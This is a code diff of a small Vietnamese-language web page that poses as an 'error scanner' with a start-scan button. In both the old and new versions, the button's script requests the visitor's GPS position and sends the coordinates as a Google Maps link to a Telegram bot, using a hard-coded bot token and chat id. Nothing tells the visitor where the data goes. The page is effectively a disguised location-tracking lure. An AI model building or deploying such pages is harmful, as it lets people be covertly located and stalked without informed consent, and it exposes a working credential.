@@ -1,13 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body style="text-align: center; padding-top: 50px; background: #111; color: white; font-family: sans-serif;">
-    <h2 style="color: red;">MÁY QUÉT LỖI 54 4VAL</h2>
-    <button onclick="getLoc()" style="padding: 20px 40px; background: red; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer;">BẮT ĐẦU QUÉT</button>
-    <div id="status" style="margin-top: 20px; color: #aaa;">Trạng thái: Sẵn sàng</div>
+<head><meta charset="UTF-8"></head>
+<body style="text-align: center; padding-top: 50px; background: #111; color: white;">
+    <h2>MÁY QUÉT LỖI 54 4VAL</h2>
+    <button onclick="getLoc()" style="padding: 20px; background: red; color: white; border-radius: 10px;">BẮT ĐẦU QUÉT</button>
+    <p id="status" style="margin-top: 20px; color: yellow;"></p>
 
     <script>
         function getLoc() {
@@ -15,39 +12,25 @@
             const token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg";
             const chat_id = "8571376502";
 
-            if (!navigator.geolocation) {
-                status.innerHTML = "Lỗi: Trình duyệt không hỗ trợ GPS";
-                return;
-            }
+            status.innerHTML = "Đang xin quyền GPS...";
 
-            status.innerHTML = "Đang xin quyền truy cập vị trí...";
-            
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    status.innerHTML = "Đã lấy tọa độ, đang gửi về Telegram...";
+                    status.innerHTML = "Đang gửi tọa độ về Telegram...";
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const text = `📍 Xe 54 4val tại: https://www.google.com/maps?q=${lat},${lon}`;
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍Xe_tai:_https://www.google.com/maps?q=${lat},${lon}`;
 
                     fetch(url)
-                        .then(res => {
-                            if(res.ok) {
-                                status.innerHTML = "✅ ĐÃ GỬI THÀNH CÔNG!";
-                                alert("Đã báo về Telegram!");
-                            } else {
-                                status.innerHTML = "❌ Lỗi Bot: Token không hợp lệ.";
-                            }
+                        .then(() => {
+                            status.innerHTML = "✅ ĐÃ GỬI THÀNH CÔNG!";
+                            alert("Kiểm tra Telegram ngay!");
                         })
-                        .catch(err => {
-                            status.innerHTML = "❌ Lỗi kết nối mạng!";
-                        });
+                        .catch(() => status.innerHTML = "❌ Lỗi mạng!");
                 },
                 (err) => {
-                    status.innerHTML = "❌ Bạn chưa bấm 'Cho phép' vị trí!";
-                    alert("Hãy bật GPS và nhấn Cho Phép!");
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
+                    status.innerHTML = "❌ Lỗi: Bạn chưa bấm 'Cho phép' vị trí!";
+                }
             );
         }
     </script>
